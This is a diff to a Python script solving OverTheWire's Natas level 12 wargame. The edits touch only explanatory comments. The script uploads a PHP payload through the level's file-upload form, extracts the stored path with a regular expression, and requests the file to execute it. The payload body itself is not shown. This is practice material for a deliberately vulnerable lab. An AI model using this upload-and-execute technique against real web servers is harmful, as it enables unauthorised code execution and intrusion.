@@ -8,6 +8,7 @@ php_payload= r'''<?php
 #need to comment!!!
 files = {'uploadedfile':('file.php', php_payload)}
 #important: params name uploaDEDfile !!!
+#files is a dictionaries
 data=dict(filename='file.php')
 url='http://natas12.natas.labs.overthewire.org/'
 #important: url ends with '/' !!!
@@ -19,7 +20,8 @@ r=requests.post(url, auth=auth, files=files, data=data)
 uploaded_file=re.findall('''(upload/\S{10}.php)''', r.content)[0]
 #re.findall(pattern, string, flags=0) return all non-overlapping matches of patern in string, as a list of string.
 #\S{10} - '\S' non-witespace characters; {10} - lenght
-#[0] - need to converting list to str
+#[0] - pointer to the first match of result reg.ex. search
+# and if without [0] we get list with two elements
 print 'Uploaded file: ', uploaded_file
 r = requests.get(url + uploaded_file, auth=auth)
 print r.content
